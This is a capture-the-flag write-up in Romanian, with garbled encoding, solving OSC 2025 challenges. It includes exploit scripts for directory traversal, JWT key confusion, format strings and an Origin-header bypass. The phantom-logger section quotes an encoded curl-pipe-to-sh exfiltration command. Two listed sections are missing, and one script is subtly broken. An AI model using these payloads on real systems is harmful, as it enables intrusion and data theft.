---
title: Olimpiada de Securitate Cibernetica OSC 2025 - RezolvÄƒri
date: 2025-03-17 00:00:00 +0200
categories: [CTF Writeups, Olimpiada de Securitate]
tags: [reverse,pwn,web,crypto,forensics,osint,misc,steganography]
image: /assets/img/logos/logo-osc.png
math: true
seo:
  keywords: [Olimpiada de Securitate Cibernetica OSC 2025, Writeups, CTF Writeups, Romanian CyberSecurity Challenge, Romanian CyberSecurity Challenge 2025, Romanian CyberSecurity Challenge 2025 Online Qualifiers, OSC, Olimpiada de Securitate Cibernetica, Olimpiada de Securitate Cibernetica 2025, Olimpiada de Securitate Cibernetica 2025 etapa judeÈ›eanÄƒ, Olimpiada de Securitate Cibernetica 2025, Cyberedu, Cyberedu CTF, CTF, CTF Writeups, Romanian CyberSecurity Challenge, Romanian CyberSecurity Challenge 2025, Romanian CyberSecurity Challenge 2025 Online Qualifiers] 
---

# RezolvÄƒri pentru Olimpiada de Securitate Cibernetica OSC 2025 etapa judeÈ›eanÄƒ

> **NotÄƒ**: Acest writeup conÈ›ine soluÈ›iile pentru provocÄƒrile din etapa judeÈ›eanÄƒ a OSC 2025. Flag-urile prezentate sunt doar pentru referinÈ›Äƒ È™i demonstraÈ›ie.

**Olimpiada de Securitate Cibernetica OSC 2025** - etapa judeÈ›eanÄƒ a avut loc pe data de 16 martie 2025. Ãn cadrul acestei competiÈ›ii elevii de liceu au avut posibilitatea sÄƒ se testeze Ã®n cadrul unei competiÈ›ii de hacking. Este prima oarÄƒ cÃ¢nd particip Ã®n aceastÄƒ competiÈ›ie Ã®n calitate de autor de subiecte.


- [RezolvÄƒri pentru Olimpiada de Securitate Cibernetica OSC 2025 etapa judeÈ›eanÄƒ](#rezolvÄƒri-pentru-olimpiada-de-securitate-cibernetica-osc-2025-etapa-judeÈ›eanÄƒ)
  - [biscuiti (Network)](#biscuiti-network)
  - [pawn-shop (Web)](#pawn-shop-web)
  - [asmventure (Reverse Engineering)](#asmventure-reverse-engineering)
  - [gold-bucket (Web/Cloud)](#gold-bucket-webcloud)
  - [lafayette (Misc)](#lafayette-misc)
  - [merchandise (Cryptography)](#merchandise-cryptography)
  - [mccrab (Web)](#mccrab-web)
  - [montogamy (Pwn)](#montogamy-pwn)
  - [flojail (Crypto)](#flojail-crypto)
  - [phantom-logger (Network/OSINT/Threat hunting)](#phantom-logger-networkosintthreat-hunting)
  - [mlue (Network)](#mlue-network)
  - [silent-relay (Reverse Engineering/Network/Misc)](#silent-relay-reverse-engineeringnetworkmisc)
  - [Digital Dust - Unraveling (Steganography)](#digital-dust---unraveling-steganography)
  


##  biscuiti (Network)

**Descriere:**
```
BiscuiÈ›ii mei au prea multe calorii, aÈ™a cÄƒ trebuie sÄƒ Ã®i Ã®mpart Ã®n mai multe porÈ›ii.

Ãn aceastÄƒ probÄƒ, aveÈ›i o capturÄƒ PCAP, iar obiectivul este sÄƒ recuperaÈ›i un secret.
```

AceastÄƒ provocare a fost una dintre cele mai uÈ™oare, avÃ¢nd Ã®n vedere cÄƒ aveam nevoie doar de a captura un secret de la un server HTTP.


**SoluÈ›ie:**
```bash
# CapturÄƒm pachetele HTTP
tshark -r task.pcap -Y "http.cookie" -T fields -e http.cookie | sort -t'=' -k2,2n | awk -F'; ' '{for (i=1; i<=NF; i++) if ($i ~ /^piece=/) print substr($i,7)}' | tr -d '\n'
```

=> `Y3Rme2FkYTAwYmZkNDRhMTYxM2M3YWI5MzM0NTk3MGY5ZjYwMWNhMDYxYmE5NjFkYmFjZmVhMGViZDAxZGUzMTQzZjV9`

Acest output a fost obÈ›inut prin capturarea pachetelor HTTP cu `tshark` È™i filtrarea cookie-urilor. Apoi, am sortat cookie-urile dupÄƒ valoarea lor numericÄƒ È™i am extras valoarea cookie-ului care conÈ›ine "piece=". Pentru a obÈ›ine flag-ul vom decoda cookie-ul din base64
pe platforma CyberChef: [https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=WTNSbWUyRmtZVEF3WW1aa05EUmhNVFl4TTJNM1lXSTVNek0wTlRrM01HWTVaall3TVdOaE1EWXhZbUU1TmpGa1ltRmpabVZoTUdWaVpEQXhaR1V6TVRRelpqVjk](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=WTNSbWUyRmtZVEF3WW1aa05EUmhNVFl4TTJNM1lXSTVNek0wTlRrM01HWTVaall3TVdOaE1EWXhZbUU1TmpGa1ltRmpabVZoTUdWaVpEQXhaR1V6TVRRelpqVjk)

**Q1. Care este raspunsul corect?** `ctf{ada00bfd44a1613c7ab93345970f9f601ca061ba961dbacfea0ebd01de3143f5}`

**Q2. Ãn contextul tehnicilor de exfiltrare a datelor Ã®ntr-o reÈ›ea, ce metodÄƒ este descrisÄƒ atunci cÃ¢nd datele sensibile sunt Ã®mpÄƒrÈ›ite Ã®n bucÄƒÈ›i mici È™i transmise folosind cÃ¢mpurile din antetele HTTP?** `HTTP Cookie Smuggling`

## pawn-shop (Web)

**Descriere:**
```
Se spune ca fericirea nu poate fi cumparata. Acesta este cazul si pentru acest magazin. Trebuie sa gasesti o vulnerabilitate in aceasta aplicatie si sa recuperezi secretul.
```

AceastÄƒ probÄƒ verificÄƒ abilitatea de a gÄƒsi vulnerabilitÄƒÈ›i Ã®n aplicaÈ›ii web È™i de a exploata acestea.
La prima vedere, aplicaÈ›ia este un "shop", unde putem vedea produse.

Pentru rezolvare am folosit tool-ul `Burp Suite` pentru a intercepta request-urile HTTP È™i am observat cÄƒ existÄƒ o vulnerabilitate.

![Verificare produs](https://github.com/user-attachments/assets/c99fbc2a-2713-438e-b2e3-94f2d1373e57)
![Verificare pentru flag](https://github.com/user-attachments/assets/0c2fd1a7-5340-4ed2-ad8f-2b5e1376fb63)

```http
HTTP/1.1 403 FORBIDDEN
Server: Werkzeug/3.0.1 Python/3.12.3
Date: Mon, 17 Mar 2025 12:55:59 GMT
Content-Type: application/json
Content-Length: 33
Access-Control-Allow-Origin: https://bit-sentinel.com
Vary: Origin
Connection: close

{"error":"Unauthorized request"}
```
CÃ¢nd Ã®ncercam sÄƒ accesez pagina pentru flag, am primit un rÄƒspuns 403 Forbidden cu mesajul "Unauthorized request".
Se observÄƒ cÄƒ serverul impune o restricÈ›ie bazatÄƒ pe Origin. Ãn mod specific, serverul permite doar request-uri provenite din https://bit-sentinel.com. Aceasta sugereazÄƒ o posibilÄƒ vulnerabilitate de CORS Misconfiguration sau Referer Header Bypass.

SoluÈ›ie:
```bash
curl -X GET "http://34.159.64.84:30179/product/flag" -H "Origin: https://bit-sentinel.com"
```

**Q1. Pentru ce este folosita metoda de control de access prezentata in challenge?**: `Pentru a facilita comunicarea dintre diferite domenii.`

**Q2. Care este raspunsul corect?**: `CTF{f6acf02ec7967731d60d0d1ccbf493d05164037c6baca60055cd71fa7501404f}`


## asmventure (Reverse Engineering)

**Descriere:**
```
You will receive a binary file. Try to find the flag inside.
```

AceastÄƒ provocare implicÄƒ analizarea unui fiÈ™ier binar pentru a descoperi flag-ul ascuns Ã®n el. Am folosit Angr, un framework puternic de analizÄƒ a executabilelor care utilizeazÄƒ execuÈ›ie simbolicÄƒ pentru a gÄƒsi calea cÄƒtre un mesaj de succes.

**SoluÈ›ie:**
```python
import angr
import sys
import claripy

def main(argv):
  path_to_binary = argv[1]
  project = angr.Project(path_to_binary)
  
  flag_chars = [claripy.BVS('flag_%d' % i, 8) for i in range(50)]  
  
  initial_state = project.factory.entry_state(stdin=flag)
  initial_state.add_constraints(flag_chars[0] == ord('O'))
  initial_state.add_constraints(flag_chars[1] == ord('S'))
  initial_state.add_constraints(flag_chars[2] == ord('C'))
  initial_state.add_constraints(flag_chars[3] == ord('{'))
  initial_state.add_constraints(flag_chars[4] == ord('r'))
  initial_state.add_constraints(flag_chars[5] == ord('3'))
  initial_state.add_constraints(flag_chars[6] == ord('v'))
  initial_state.add_constraints(flag_chars[7] == ord('_'))
  
  # Add constraints for printable ASCII characters for possible flag content
  for i in range(8, 30):
    # Constrain characters to printable ASCII (33-126) or a closing brace
    initial_state.add_constraints(
      claripy.Or(
        claripy.And(flag_chars[i] >= 33, flag_chars[i] <= 126),
        flag_chars[i] == ord('}')
      )
    )
    # If we find a closing brace, constrain all following characters to be null or ASCII
    for j in range(i+1, 30):
      initial_state.add_constraints(
        claripy.Or(
          flag_chars[j] == 0,
          claripy.And(flag_chars[j] >= 32, flag_chars[j] <= 126)
        )
      )
  
  simulation = project.factory.simgr(initial_state)

  def is_successful(state):
    # Successful print - cÄƒutam mesajul "felicitari!!"
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return b'felicitari!!' in stdout_output

  simulation.explore(find=is_successful)

  if simulation.found:
    solution_state = simulation.found[0]
    solution_bytes = solution_state.posix.dumps(sys.stdin.fileno())
    
    # Extract the flag by finding the closing brace
    flag_str = ""
    try:
      # Convert to string and clean up
      solution_str = solution_bytes.decode('utf-8', errors='ignore')
      # Find the proper flag format
      start = solution_str.find("OSC{")
      if start >= 0:
        end = solution_str.find("}", start)
        if end >= 0:
          flag_str = solution_str[start:end+1]
    except:
      pass
    
    print("Raw solution:", solution_bytes)
    if flag_str:
      print("Extracted flag:", flag_str)
    
  else:
    raise Exception('Could not find the solution')
```

**Flag:** `OSC{r3v_m4st3rz}`

## gold-bucket (Web/Cloud)

**Descriere:**
```
Ãntr-o lume tot mai digitalizatÄƒ, securitatea Ã®n cloud a devenit un aspect critic pentru companii È™i instituÈ›ii care Ã®È™i migreazÄƒ infrastructura È™i datele Ã®n medii cloud. Aceasta implicÄƒ un set de politici, tehnologii È™i bune practici menite sÄƒ protejeze datele, aplicaÈ›iile È™i serviciile stocate Ã®n cloud de acces neautorizat, atacuri cibernetice È™i pierderi de date.

Obiectivul este sa recuperezi un mesaj secret din serviciul de mai jos. Mult succes!
```

AceastÄƒ provocare implica accesarea unui bucket S3 Ã®n AWS pentru a obÈ›ine flag-ul. SoluÈ›ia a implicat asumarea unui rol prin AWS STS (Security Token Service) È™i utilizarea credenÈ›ialelor temporare pentru a accesa bucket-ul S3 È™i a obÈ›ine flag-ul.

**SoluÈ›ie:**
```bash
# AsumÄƒm un rol Ã®n AWS folosind STS
aws sts assume-role \
    --role-arn arn:aws:iam::011528296162:role/osc-golden-role \
    --role-session-name s3hacker-session \
    --tags Key=SessionName,Value=s3hacker-session

# SetÄƒm credenÈ›ialele temporare obÈ›inute 
export AWS_ACCESS_KEY_ID=?
export AWS_SECRET_ACCESS_KEY=?
export AWS_SESSION_TOKEN=?

# DescÄƒrcÄƒm flag-ul din bucket
aws s3 cp s3://osc-golden-bucket/flag.txt .
```

**Flag:** `CTF{4e6ca26fb88149f73ddac3add64a796d32bb302e68a954dce346fd36472bd310}`

## lafayette (Misc)

**Descriere:**
```
Lafayette a fost un aristocrat francez È™i ofiÈ›er militar. Din cauza vÃ¢rstei, a Ã®nceput sÄƒ uite atacurile sale, aÈ™a cÄƒ a creat un serviciu unde le putea stoca. PoÈ›i ajuta sÄƒ recuperÄƒm cel mai secret atac al sÄƒu?
```

Provocarea implicÄƒ o aplicaÈ›ie server Node.js vulnerabilÄƒ la un atac de tip directory traversal. ExploatÃ¢nd aceastÄƒ vulnerabilitate, am putut citi fiÈ™ierul flag.ctf de pe server.

**Analiza:**
1. AplicaÈ›ia oferÄƒ 3 opÈ›iuni:
   - Create attack (neimplementatÄƒ)
   - Get current attacks
   - Quit

2. Din Dockerfile observÄƒm cÄƒ flag-ul se aflÄƒ Ã®n `/flag.ctf`

3. Codul verificÄƒ ID-ul introdus Ã®n douÄƒ moduri:
   ```javascript
   if (id.includes("..") || id.includes("/")) {
       console.log("Why are you sneaky? Just because Lafayette was sneaky?");
       showMainMenu();
       return;
   }

   // Check if ID is part of attacks.json
   const attacks = loadAttacks();
   const attack = attacks.attacks.find((attack) => eval(attack.regex).test(id));
   ```

4. ObservÄƒm douÄƒ verificÄƒri de securitate:
   - VerificÄƒ dacÄƒ ID-ul conÈ›ine ".." sau "/" folosind `includes()`
   - VerificÄƒ dacÄƒ ID-ul se potriveÈ™te cu un regex din attacks.json

**SoluÈ›ie:**
1. Bypass pentru verificarea `includes()`:
   - Folosim un array Ã®n loc de string pentru ID
   - `includes()` va verifica dacÄƒ array-ul conÈ›ine elementul "..", nu dacÄƒ conÈ›ine caracterele "..", nu verificÄƒ Ã®n adÃ¢ncime.

2. Bypass pentru verificarea regex:
   - Unul din atacuri foloseÈ™te regex-ul `/^4+$/m`
   - Flag-ul `m` face regex-ul sÄƒ fie multiline
   - Putem crea un payload cu o linie conÈ›inÃ¢nd "4" È™i alta linie cu ce vrem noi
   - Putem crea linii noi folosind `\u000a` sau `\n` Ã®n JSON

3. Bypass pentru extensia `.txt`:
   - Codul adaugÄƒ `.txt` la ID
   - Flag-ul este Ã®n `/flag.ctf`
   - Codul foloseÈ™te `strip()` pentru a lua doar primele 50 de caractere
   - Putem face payload-ul suficient de lung pentru a "elimina" extensia `.txt`

```python
#!/usr/bin/env python3
from pwn import *
context.log_level = "debug"

def exploit():
    p = remote("localhost", 4444)

    p.recvuntil("Enter your choice: ")

    # SelectÄƒm opÈ›iunea de a vizualiza detaliile unui atac
    p.sendline("2")
    
    p.recvuntil("Enter attack ID to view details: ")

    # Construim payload-ul care exploateazÄƒ vulnerabilitatea de directory traversal
    payload = '["444444444444444444444444444444444444444444444\\n../../../../../../../../../../../../../../../../../flag.ctf"]'

    log.info("Sending payload: " + payload)
    p.sendline(payload)
    
    # Primim rÄƒspunsul care ar trebui sÄƒ conÈ›inÄƒ flag-ul
    data = p.recv(timeout=2)
    print(data.decode())
    
    # MenÈ›inem conexiunea interactivÄƒ
    p.interactive()
```

**Flag:** `CTF{0834a9094bfb34aa45759c9f887d183c0e5e0386ae702e89cadf66766bf6054a}`

## merchandise (Cryptography)

**Descriere:**
```
The Merchant of DOOM era un traficant de arme notoriu, care prospera prin reÈ›ele complexe È™i logisticÄƒ avansatÄƒ. ÃÈ™i codifica tranzacÈ›iile Ã®ntr-un mod unic, folosind vectori pentru a-È™i ascunde afacerile. PoÈ›i descifra operaÈ›iunile sale secrete È™i descoperi Ã®nÈ›elegerile ascunse?
```

Provocarea implicÄƒ un server Sage care cere un vector B cu 3 numere Ã®ntregi, pentru simplitate eu am ales vectorul B = [0, 0, 1], baza canonicÄƒ Ã®n spaÈ›iu vectorial $$R^3$$. Serverul calculeazÄƒ produsul vectorial (cross product) Ã®ntre un vector A secret È™i vectorul B furnizat de noi, apoi foloseÈ™te un hash al produsului vectorial pentru a genera o cheie de criptare AES pentru flag.

**SoluÈ›ie:**
```python
from Crypto.Cipher import AES
from hashlib import sha256
import socket
import re
import time

def decrypt_flag(key, encrypted_flag_hex):
    # Convert from hex to bytes
    encrypted_flag = bytes.fromhex(encrypted_flag_hex)
    
    # Decrypt
    cipher = AES.new(key, AES.MODE_ECB)
    padded_flag = cipher.decrypt(encrypted_flag)
    
    # Remove padding
    pad_len = padded_flag[-1]
    flag = padded_flag[:-pad_len]
    
    return flag

def recvall(sock, timeout=2):
    # Set a timeout so we don't wait forever
    sock.settimeout(timeout)
    data = b''
    
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            # Small delay to check if more data is coming
            time.sleep(0.1)
    except socket.timeout:
        pass  # This is expected
    
    return data.decode('utf-8', errors='ignore')

def solve():
    # Connect to the service
    HOST = 'localhost'  # SchimbÄƒ cu hostul real unde ruleazÄƒ serviciul
    PORT = 4141         # Portul din Dockerfile
    
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            
            # Read initial prompt
            initial_data = recvall(s)
            
            # Trimitem vectorul B
            # Folosim B = [0, 0, 1] pentru a crea un produs vectorial unde:
            # cP[0] = A[1], cP[1] = -A[0], cP[2] = 0
            # Acest vector funcÈ›ioneazÄƒ indiferent de valorile lui A
            B = "0 0 1"
            
            s.sendall((B + "\n").encode())
            
            # Primim rÄƒspunsul
            full_response = recvall(s)
            
            # Extragem produsul vectorial din output-ul de debug
            cp_match = re.search(r"DEBUG cP: (.*?)(?:\n|$)", full_response)
            if cp_match:
                cp_str = cp_match.group(1)
                
                # GenerÄƒm cheia de criptare din hash-ul SHA-256 al produsului vectorial
                encryption_key = sha256(str(cp_str).encode()).digest()
                
                # Extragem flag-ul criptat
                encrypted_flag_match = re.search(r"jumbled up prize: ([0-9a-f]+)", full_response)
                if encrypted_flag_match:
                    encrypted_flag_hex = encrypted_flag_match.group(1)
                    
                    # DecriptÄƒm flag-ul
                    flag = decrypt_flag(encryption_key, encrypted_flag_hex)
                    print(f"Flag: {flag.decode()}")
    
    except Exception as e:
        print(f"Error: {e}")
```

**Flag:** `CTF{76b6e66355e0ae005021842c8082b9f3595aa04c7d574567ca73a37db5d1f790}`

## mccrab (Web)

**Descriere:**
```
Recent, m-am Ã®ntÃ¢lnit cu Ferris, crab-ul. Mi-a spus cÄƒ organizeazÄƒ o petrecere rave. De fapt, organizeazÄƒ crabrave! Acum, dacÄƒ citeÈ™ti acest mesaj, probabil cÄƒ NU eÈ™ti un crab. Dar poÈ›i totuÈ™i sÄƒ te alÄƒturi petrecerii! Oamenii care sunt foarte bogaÈ›i Ã®n moneda crabilor pot cumpÄƒra un bilet (adicÄƒ flag-ul) È™i se pot alÄƒtura distracÈ›iei. GÄƒseÈ™te flag-ul È™i vino la crabrave!

PS: S-ar putea sÄƒ fie nevoie sÄƒ te "oxidezi" puÈ›in...

PS2: Daca incerci sa pornesti dockerul local, arhiva are nevoie de acest .env

TEMPLATES_PATH=/app/views
STATIC_PATH=/app/static
DB_FILE=/app/database.db
```

**Analiza:**
1. Flag-ul este stocat Ã®n baza de date la iniÈ›ializare:
```rust
conn.execute(
    "INSERT OR IGNORE INTO products (name, description, icon, price, product_data) VALUES 
    ...,
    ('Crab Flag', \"Don't worry about this one\", 'crab_flag.png', 1337, ?1)",
    params![
        fs::read_to_string("/mnt/flags/flags.txt")
            .and_then(|flag| {
                fs::remove_file("/mnt/flags/flags.txt").unwrap_or_default();
                Ok(flag)
            })
            .unwrap_or("OSC{fake_flag}".to_string())
    ],
)?;
```

2. Pentru a obÈ›ine flag-ul, trebuie sÄƒ:
   - Avem un balance de minim 1337
   - Username-ul trebuie sÄƒ fie "KingCrab"
   - Trebuie sÄƒ cumpÄƒrÄƒm produsul cu ID-ul 6 (flag-ul)

3. Autentificarea se bazeazÄƒ pe un sistem JWT custom:
   - Cookie-ul este semnat folosind algoritmul SM2 (curbÄƒ elipticÄƒ)
   - Se foloseÈ™te un salt unic: `b"McOSC"` XOR cu datele È™i Ã®nmulÈ›it cu 1337

4. Vulnerabilitatea:
   - Ãn `cuchi_verify` existÄƒ douÄƒ tipuri de verificare a semnÄƒturii:
     - CRABCURVE: foloseÈ™te SM2
     - CRABRAVE: foloseÈ™te ChaCha20
   - Ãn cazul CRABRAVE, se foloseÈ™te cheia publicÄƒ pentru verificare Ã®n loc de cheia privatÄƒ (Key confusion)
   - Cheia publicÄƒ este accesibilÄƒ prin ruta `/static`

**SoluÈ›ie:**
1. DescÄƒrcÄƒm cheia publicÄƒ de la `/static/public-key.pem`

2. CreÄƒm un program Rust pentru a genera cookie-ul dorit:

```rust
use smcrypto::sm2;
use serde_json::json;
use base64::{engine::general_purpose::STANDARD_NO_PAD, Engine as _};
use chacha20poly1305::{
    aead::{
        Aead,
        generic_array::GenericArray
    }, ChaCha20Poly1305, Key, KeyInit, Nonce
};
use sha2::{Sha256, Digest};

fn main() {
    let header = json!({
        "alg": "CRABRAVE",
        "typ": "JWT"
    });
    let payload = json!({
        "id": 1,
        "username": "KingCrab",
        "balance": 1000000
    });
    let salted_data = payload.to_string().as_bytes()
        .iter()
        .zip(
            b"McOSC"
                .iter()
                .cycle()
        )
        .map(|(a, b)| ((a ^ b) as i32 * 1337) as u8)
        .collect::<Vec<u8>>();
    let kp = sm2::pubkey_from_pem_file("public-key.pem");
    let k: &Key = GenericArray::from_slice(kp.as_bytes()[..32].as_ref());
    let chacha_ctx = ChaCha20Poly1305::new(k);
    let daigest = Sha256::digest(&salted_data);
    let nonce = Nonce::from_slice(
        &daigest.as_slice()[..12]
    );
    let encrypted = chacha_ctx.encrypt(&nonce, salted_data.as_slice()).unwrap();
    let jwt = format!(
        "{}.{}.{}",
        STANDARD_NO_PAD.encode(&header.to_string().as_bytes()),
        STANDARD_NO_PAD.encode(&payload.to_string().as_bytes()),
        STANDARD_NO_PAD.encode(&encrypted)
    );
    println!("{}", jwt);
}
```

3. DependenÈ›e necesare Ã®n `Cargo.toml`:

```toml
base64 = "0.22.1"
chacha20poly1305 = "0.10.1"
hex = "0.4.3"
lazy_static = "1.5.0"
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0.125"
sha2 = "0.10.8"
smcrypto = "0.3.1"
```

4. Folosim cookie-ul generat pentru a cumpÄƒra flag-ul:
```http
GET /buy?id=6 HTTP/1.1
Host: 0.0.0.0:1337
Cookie: crab_token=<token-ul generat>
Connection: keep-alive
```

**Flag:** `OSC{fake_flag}`

## montogamy (Pwn)

**Descriere:**
```
E prima data cand ai un contact cu o proba de pwn? Acest exercitiu s-ar putea sa fie pentru tine.

PS: Acest serviciu merge cu netcat.
```

AceastÄƒ provocare implicÄƒ o vulnerabilitate de tip format string Ã®ntr-un program. ExploatÄƒm aceastÄƒ vulnerabilitate pentru a extrage informaÈ›ii din memoria programului.

**SoluÈ›ie:**
```python
from pwn import *

#context.log_level = 'debug'
context.arch = 'amd64'

ip = "?"  # IP-ul serverului
port = "?"  # Portul serverului

r = remote(ip, port)

def main():
    r.recvuntil('Enter your input: ')
    # Format string printf pentru a prelua date din stivÄƒ
    payload = b'%lx' * 100
    r.sendline(payload)
    msg = r.recvall().strip().split(b'\n')[-1]
    if msg.startswith(b"b'") and msg.endswith(b"'"):
        msg = msg[2:-1]
    msg_str = msg.decode()
    flag_hex = ""
    
    # Convertim È™irul hexadecimal Ã®n caractere
    for i in range(0, len(msg_str), 2):
        try:
            char = bytes.fromhex(msg_str[i:i+2]).decode('ascii')
            flag_hex += char
        except:
            flag_hex += '.'
    print(flag_hex)

    # InversÄƒm ordinea octeÈ›ilor pentru a obÈ›ine flag-ul corect
    flag_hex = [flag_hex[i:i+4] for i in range(0, len(flag_hex), 4)]
    flag_hex = [i[::-1] for i in flag_hex]
    flag_hex = ''.join(flag_hex)
    print(flag_hex)

if __name__ == '__main__':
    main()
```

**Q1. Care este raspunsul corect? :** `CTF{fake_flag}`, flag-uri sunt dinamice.

**Q2. Care dintre urmÄƒtoarele funcÈ›ii poate fi vulnerabilÄƒ la un format string attack?** `printf`

## flojail (Crypto)

**Descriere:**
```
Crezi cÄƒ poÈ›i rezolva o ecuaÈ›ie matematicÄƒ? Cred cÄƒ ar trebui sÄƒ Ã®ncerci aceasta.
```

Aceasta este problema propusa de mine in cadrul concursului OSC 2025. Problema implicÄƒ manipularea reprezentÄƒrii Ã®n virgulÄƒ mobilÄƒ IEEE-754 È™i gÄƒsirea unui numÄƒr specific care satisface anumite condiÈ›ii matematice.

![Mantisa](https://www.puntoflotante.net/IEEE-754-ENGLISH.jpg)

ExaminÃ¢nd fiÈ™ierul `chall.py`, observÄƒm urmÄƒtoarele aspecte cheie:

1. Avem o valoare secretÄƒ `n` care trebuie gÄƒsitÄƒ
2. Se foloseÈ™te constanta `pi` din modulul `math`
3. ExistÄƒ urmÄƒtoarele constrÃ¢ngeri pentru `n`:
   - Este un numÄƒr Ã®ntreg (int)
   - Este Ã®n intervalul (2^40, 2^50)
   - Este impar
   - Satisface condiÈ›ia `pi % (pi/n) == 0`
4. Se calculeazÄƒ hash-ul SHA256 al lui `n` convertit Ã®n bytes
5. Hash-ul È›intÄƒ este: `245d4f6a2ef061ca778a0bdfc0f28eafa36d73a139376d836486d18e402d29dc`

**SoluÈ›ie:**

PaÈ™ii cheie ai soluÈ›iei:

1. Extragem mantisa lui pi din reprezentarea sa IEEE-754
2. FactorizÄƒm mantisa pentru a gÄƒsi posibilele valori ale lui n
3. VerificÄƒm care dintre aceste valori satisfac toate condiÈ›iile
4. TestÄƒm hash-ul pentru valorile candidate

Am folosit SageMath pentru a rezolva problema.
```python
from hashlib import sha256
from Crypto.Util.number import long_to_bytes
import struct

def float_to_bits(f):
    return struct.unpack(">Q", struct.pack(">d", f))[0]

def bits_to_float(b):
    return struct.unpack(">d", struct.pack(">Q", b))[0]

def calc(x, n):
    x_bits = float_to_bits(x)
    y_bits = float_to_bits(n)

    x_mantissa = x_bits & ((1 << 52) - 1) | (1 << 52)
    y_mantissa = y_bits & ((1 << 52) - 1) | (1 << 52)

    print(x_mantissa, y_mantissa)

    result_exponent = ((x_bits >> 52) & 0x7FF) - ((y_bits >> 52) & 0x7FF) + (y_bits >> 52) & 0x7FF
    result_mantissa = ((x_mantissa << 52) // y_mantissa * y_mantissa) >> 52

    result_bits = (result_exponent << 52) | (result_mantissa & ((1 << 52) - 1))
    print(result_bits)
    return bits_to_float(result_bits)
    

from math import pi
from sage.all import factor, prod
from itertools import product

x = pi
x_bits = float_to_bits(x)
x_mantissa = x_bits & ((1 << 52) - 1) | (1 << 52)
factors = factor(x_mantissa)

d = [prod(item) for item in product(*[[p**k for k in range(e+1)] for p,e in factors])]
d = sorted(d)
correct = [f for f in d if (2**40 < f < 2**50 and f%2 == 1)]

for n in correct:
    p1 = x % (x/n)
    c1 = x - calc(x, n)
    if sha256(long_to_bytes(n)).hexdigest() == "245d4f6a2ef061ca778a0bdfc0f28eafa36d73a139376d836486d18e402d29dc":
        print("Found n:", n)
        break
```


## phantom-logger (Network/OSINT/Threat hunting)

**Descriere:**
```
Un serviciu obiÈ™nuit de jurnalizare web funcÈ›ioneazÄƒ Ã®n fundal, colectÃ¢nd È™irurile de User-Agent din cererile primite.
TotuÈ™i, Ã®n spatele aparenÈ›elor, ceva nu este Ã®n regulÄƒ â€“ existÄƒ suspiciuni privind o portiÈ›Äƒ de acces ascunsÄƒ.
```

**SoluÈ›ie:**

Am Ã®nceput sÄƒ mÄƒ uit prin pachetele din fiÈ™ier È™i am reuÈ™it sÄƒ gÄƒsesc un mesaj encodat la secÈ›iunea `User-agent`. M-am folosit de `tshark` pentru a cÄƒuta Ã®n tot fiÈ™ierul mai multe mesaje encodate:
```bash
tshark -r capture.pcap -Y http.request -T fields -e http.user_agent
```

Folosind aceastÄƒ comandÄƒ am observat un string special `3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSGFja2VyMzk1LUFMVC1GNC9VcGxvYWRlZF9maWxlcy9yZWZzL2hlYWRzL21haW4vZXhmaWxzaC5zaCB8IHNo`. L-am pus pe [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B%3D',true,false)&input=WTNWeWJDQm9kSFJ3Y3pvdkwzSmhkeTVuYVhSb2RXSjFjMlZ5WTI5dWRHVnVkQzVqYjIwdlNHRmphMlZ5TXprMUxVRk1WQzFHTkM5VmNHeHZZV1JsWkY5bWFXeGxjeTl5WldaekwyaGxZV1J6TDIxaGFXNHZaWGhtYVd3dWMyZ2dmQ0J6YUE9PQ) È™i am primit un link de GitHub.

![phantomlogger1](https://github.com/user-attachments/assets/0176b5dd-ff3a-4fcf-b3b5-44f2d9f06ae2)

Din categoria challenge-ului mi-am dat seama cÄƒ trebuie sÄƒ fac OSINT pe autorul acestui proiect. Am gÄƒsit acest commit unde am Ã®nÈ›eles cÄƒ trebuie sÄƒ XOR-am toate numerele unde apare DNS-ul `rocsc.ro`.

`https://github.com/Hacker395-ALT-F4/Uploaded_files/commit/54bda9536f3a3b99a05aa4ad060cbe30c05d03cc`

Din nou m-am folosit de `tshark`:
```bash
tshark -r input_file.pcapng -Y dns -T fields -e dns.qry.name -e dns.resp.name | grep 'rocsc.ro' > fisier.txt
```
Am mai extras doar numerele din fiÈ™ier cu:
```bash
awk -F'.' '!seen[$1]++ {print $1}' fisier.txt > fisier.txt
```
È™i am pus numerele pe CyberChef È™i am gÄƒsit flag-ul.

![phantomlogger2](https://github.com/user-attachments/assets/aceb84b0-fe19-4a28-95ec-5dbf1f231ea2)

**Q1. Ce se Ã®ntÃ¢mplÄƒ atunci cÃ¢nd un client face o cerere DNS pentru un nume de domeniu pe care nu l-a mai rezolvat recent?**: Clientul verificÄƒ mai Ã®ntÃ¢i cache-ul sÄƒu local È™i, dacÄƒ nu gÄƒseÈ™te o intrare validÄƒ, transmite cererea cÄƒtre un resolver DNS. 

**Q2. IdentificÄƒ datele exfiltrate**: `CTF{b19697af5a6a848037a571ab3eb5dd7b0fd2ab914c598fdcb1152a5ae5d64982}`

## mlue (Network)

**Descriere:**
```
Ãn urma unui atac cibernetic, a fost obÈ›inut fiÈ™ierul mlue.pcapng pentru investigaÈ›ie. AnalizeazÄƒ fiÈ™ierul È™i rÄƒspunde la urmÄƒtoarele Ã®ntrebÄƒri.
```

AceastÄƒ provocare implicÄƒ analiza unui fiÈ™ier PCAPNG pentru a gasi numele malware-ului care ruleazÄƒ pe staÈ›ia compromisÄƒ,IP-ul si port-ul pentru serverul de C2 È™i Ce comanda a fost executata pe serverul de C2, pentru a exfiltra date.

**Solutie**

Pentru inceput am studiat pachetele fisierului pe care le-am primit. Spre final am reusit sa gasesc ceva interesant in fluxul TCP cu ID-ul 9 asa  ca am filtrat pachetele folosind comanda `tcp.stream eq 9` . 

![](https://github.com/user-attachments/assets/2bf693ad-f5bb-4351-bc67-461914500ea8)

Urmarind acest stream am reusit sa gasesc raspunsul intrebarii a 3-a:
`ps`

![](https://github.com/user-attachments/assets/a6316b55-3f9f-4101-a6f5-ca328c63387b)


